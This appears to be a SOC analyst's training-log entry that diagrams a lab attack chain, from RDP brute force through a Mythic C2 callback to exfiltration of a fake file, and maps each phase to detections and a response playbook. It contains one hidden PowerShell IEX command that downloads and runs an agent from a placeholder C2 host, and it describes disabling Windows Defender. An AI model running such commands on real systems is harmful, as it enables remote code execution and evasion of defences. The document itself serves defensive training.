# Day 19 — Attack Diagram & Attack Plan

**My DFIR / SOC Analyst — 30-Day Challenge**
**Date:** 14 October, 2025
**Author:** Syed Saif Araizi

---

## Overview (single-section documentation)

This document covers Day 19 of the 30-day SOC analyst challenge: **Designing an Attack Diagram and Attack Plan**. It explains the demo steps used to build the attack diagram, describes each phase of the planned attack (initial access through exfiltration), lists the commands and techniques used in each phase, summarizes telemetry and detection opportunities, outlines safe lab setup guidance, suggested exercises, artifacts to collect, and next steps. **All content below is contained inside this single markdown section** so it can be pasted directly into a `.md` file for GitHub.

---

## Goal for Day 19

- Create a clear attack diagram and step-by-step plan that maps the attack path from an attacker laptop to a Windows Server C2 compromise and exfiltration.
- Identify what telemetry each phase will likely generate and how defenders can detect those behaviours.
- Prepare a safe lab workflow to simulate the attack in an isolated environment and collect artifacts for analysis.

---

## Demo summary — what we built

Using draw.io (or diagrams.net) we sketched a simple attack diagram consisting of:

- **Attacker laptop (Kali Linux)** — host launching attacks (red).
- **Internet (cloud)** — network transit and C2 hosting.
- **Mythic C2 server (Vultr / cloud provider)** — hosts payloads/agents (red).
- **Windows Server (target)** — victim being attacked (target of RDP brute force, later hosting fake data).
- **Optional SSH server** — extra target for later practice.

The end-to-end planned attack contains 6 phases that map to typical adversary behaviours: Initial Access → Discovery → Defense Evasion → Execution → Command & Control → Exfiltration.

---

![Attack Diagram](../images/19-AttackDiagram.png)

## Attack phases & detailed steps

**Phase 1 — Initial Access (RDP brute force)**

- Action: From Kali, perform an RDP brute force against the Windows Server to obtain valid credentials.
- Demo intent: Use automated tooling or scripted attempts against RDP (lab-only).
- Indicators / telemetry: Numerous failed RDP auth attempts over short time window, multiple source IPs (if proxying), successful login event (Windows Event ID 4624 with RDP logon type), increased account lockouts, Windows Security logs.

**Phase 2 — Discovery (post-auth interactive checks)**

- Action: After successful RDP login, run simple discovery commands to assess privileges and environment: `whoami`, `ipconfig`, `net user`, `net group`.
- Purpose: Confirm current account privileges and identify local network configuration and accessible resources.
- Indicators / telemetry: Process creation events (Sysmon Event ID 1 / Event ID 4688), command-line arguments in process logs, network configuration queries, console history if captured.

**Phase 3 — Defense Evasion (disable Windows Defender)**

- Action: Attempt to disable or tamper with Windows Defender to avoid detection (for lab simulation, perform controlled, reversible steps).
- Example approaches (lab simulation): modify Defender preferences via PowerShell cmdlets or temporarily stop relevant services (in isolated environment only).
- Indicators / telemetry: Service stop events, Windows Event Logs related to Defender, PowerShell logs (Module logging / ScriptBlock logging), EDR alerts for tampering attempts.

**Phase 4 — Execution (download and run agent via PowerShell IEX)**

- Action: Use PowerShell `IEX` / `Invoke-Expression` to download and execute the Mythic agent from the C2 server (e.g., `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<c2>/agent.ps1')"`).
- Purpose: Stage and execute the agent to establish a persistent callback.
- Indicators / telemetry: Outbound HTTP(s) GET to suspicious host, process creation for `powershell.exe`, PowerShell command-line telemetry, proxy logs, EDR detections for known downloader patterns.

**Phase 5 — Command & Control (establish C2 session)**

- Action: Agent opens a C2 channel back to the Mythic server (HTTP/HTTPS/DNS/mTLS based on profile).
- Operator actions: Issue commands, upload tools, run discovery & lateral movement commands from the operator console.
- Indicators / telemetry: Regular beaconing intervals, unusual User-Agent or encrypted payload blobs, DNS anomalies (if using DNS), JA3/JA3S mismatches, network metadata patterns, correlating process to network connections on host.

**Phase 6 — Exfiltration (download fake `passwords.txt` and retrieve it via C2)**

- Action: Create a fake `passwords.txt` on the Windows Server in the demo, then use the established C2 channel to exfiltrate it to the operator.
- Indicators / telemetry: Outbound data transfer patterns, file access timestamps, PowerShell or agent activity performing file transfer, file staging artifacts, netflow showing data volume increases.

---

## Notes on diagram specifics and choices

- The attack flow is linear but real attacks may add branching: privilege escalation, lateral movement (SMB, PSExec, WinRM), credential dumping, persistence mechanisms (services, scheduled tasks, Run keys).
- The demo uses RDP brute force for initial access because it illustrates noisy authentication behaviour and clear Windows event telemetry. Replace initial vector (phishing, SMB exploit) as needed for varied practice.
- Mythic was chosen as the C2 framework for the lab demo because it clearly shows payload staging, agent profiles, and callback management; it’s commonly used for training and simulation.

---

## Telemetry and detection mapping (phase → telemetry → suggested detections)

- **Initial Access** → Windows Security logs (failed & successful logons), firewall logs → Detection: rate-limit RDP attempts, alert on many failed auths followed by a success.
- **Discovery** → Process creation logs (Sysmon), command line audit → Detection: alert on abnormal use of `net user`, `net group`, `whoami` executed by non-admin processes or from unusual sessions.
- **Defense Evasion** → Service stops, PowerShell modifications → Detection: alert on `Stop-Service` for Defender services, suspicious PowerShell invocation with obfuscated flags.
- **Execution** → Web requests for scripts, `powershell.exe` executions → Detection: proxy/HTTP logs for `DownloadString` patterns, blocklist domains, EDR script-block logging.
- **C2** → Periodic beaconing, TLS fingerprint anomalies → Detection: beacon detection (regular intervals), inspect JA3/JA3S, analyze packet sizes & timing, monitor DNS for high entropy domains.
- **Exfiltration** → Large outbound transfers, repeated GETs/POSTs to same destination → Detection: data-volume anomalies, DLP alerts, and correlation to process that accessed the file.

---

## Safe lab guidance (mandatory)

- **Isolate the environment**: Use host-only or NAT-isolated VMs and a dedicated lab VLAN. Do NOT connect offensive tooling or payloads to your production network or to the public internet.
- **Use snapshots**: Snapshot VMs before testing so you can revert.
- **Simulate and sanitize**: Use fake payloads and fake data (e.g., `passwords.txt`) rather than real sensitive content.
- **Restrict egress**: If you must use a cloud-hosted C2, restrict it to lab-controlled endpoints and firewall rules; better: host the C2 on a lab-only network or private host.
- **Log everything**: Enable Sysmon, PowerShell logging, network PCAP collection, proxy logging, and retain logs for analysis.
- **Legal & ethical**: Only test on systems you own or have explicit permission to use.

---

## Suggested exercises (hands-on / defensive focus)

1. **Create the attack diagram**: Recreate the draw.io diagram in your repo (export PNG/SVG) and commit it under `day-19/diagram/`.
2. **Simulate RDP brute force (controlled)**: Use a small number of attempts in your isolated lab and collect Windows Security logs.
3. **Perform discovery commands**: From the RDP session, run `whoami`, `ipconfig`, `net user` and collect Sysmon/process logs to map command execution to telemetry.
4. **Simulate a benign downloader**: Host a simple script on an internal webserver and use PowerShell `IEX` to fetch it (lab-only) to analyze network signatures.
5. **Establish a local Mythic instance (lab)**: Optionally install Mythic in a sandboxed environment and generate an agent to observe callback behaviours.
6. **Exfiltration simulation**: Create a fake `passwords.txt` file and use a scripted GET/POST to move it to the operator host, then search for telemetry covering the transfer.

---

## Artifacts to collect (lab)

- PCAP(s) of all network traffic during the exercise.
- Sysmon logs (process creation, network connection events).
- Windows Event logs (Security, System, Application).
- PowerShell scriptblock logs and command-line arguments.
- Copies of any staging scripts or payloads used (sanitized).
- A timeline (CSV/markdown) of actions and timestamps.

---

## SOC Playbook snippet — Attack diagram response (copyable)

**Title:** RDP Brute Force → C2 Compromise (Simulated)
**Trigger:** Multiple failed RDP attempts followed by a successful RDP logon on a host; subsequent suspicious PowerShell download activity.
**Telemetry required:** Windows Security logs, Sysmon process & network logs, proxy/web logs, PCAP/NetFlow.

**High-level investigation steps:**

1. Identify the host and isolate it from the network (or snapshot in lab).
2. Pull Windows Security & Sysmon logs for the timeframe of brute forcing and initial login.
3. Correlate successful logon to subsequent process creations (PowerShell, cmd.exe).
4. Inspect outbound connections and proxy logs for downloads (IEX/DownloadString) and C2 callback activity.
5. If C2 confirmed — collect memory, disk images and identify persistence mechanisms.
6. Contain and remediate: block destination IPs/domains, remove persistence, rotate compromised credentials, reimage if needed.

**Post-incident:** Update detection rules to detect RDP brute-force patterns + follow-up download behaviour; document IOCs and add to blocklists where appropriate.

---

## Mapping to MITRE ATT&CK (examples)

- Initial Access: Brute Force — T1110
- Discovery: System Information Discovery — T1082
- Defense Evasion: Disable or Evade AV — T1539 / T1562 (contextual mapping)
- Execution: Command and Scripting Interpreter (PowerShell) — T1059.001
- Command & Control: Application Layer Protocols, Beaconing — T1071
- Exfiltration: Exfiltration Over C2 Channel — T1041 (or T1020 depending on method)

---

## Repo assets to include for Day 19

Create a `day-19/` directory with the following recommended files:

- `day-19/diagram/attack-diagram.drawio` or exported `attack-diagram.png` (from draw.io).
- `day-19/day-19-notes.md` (this document or a short summary).
- `day-19/playbooks/rdp-c2-playbook.md` (SOC playbook template).
- `day-19/lab-artifacts/` (pcaps, sanitized logs, timeline CSV — ensure all artifacts are sanitized and safe).
- `day-19/ioc-list.txt` (Lab-only IOCs used during simulation).

---

## Next steps (Day 20 preview)

- Begin provisioning lab infrastructure for the attack: spin up the Mythic server (lab-only), configure the attacker Kali VM, and prepare the Windows Server snapshot.
- Walkthrough basic Mythic setup and generate a benign agent to observe callback telemetry.
- Expand the attack diagram to add optional lateral movement, credential dumping, and persistence paths for deeper detection practice.

---

## Ethics & safety reminder

This documentation is strictly for **defensive training and education in a controlled environment**. Do not deploy offensive tools or run these techniques against networks or systems you do not own or have explicit permission to test. Always follow legal and organizational policies.

---
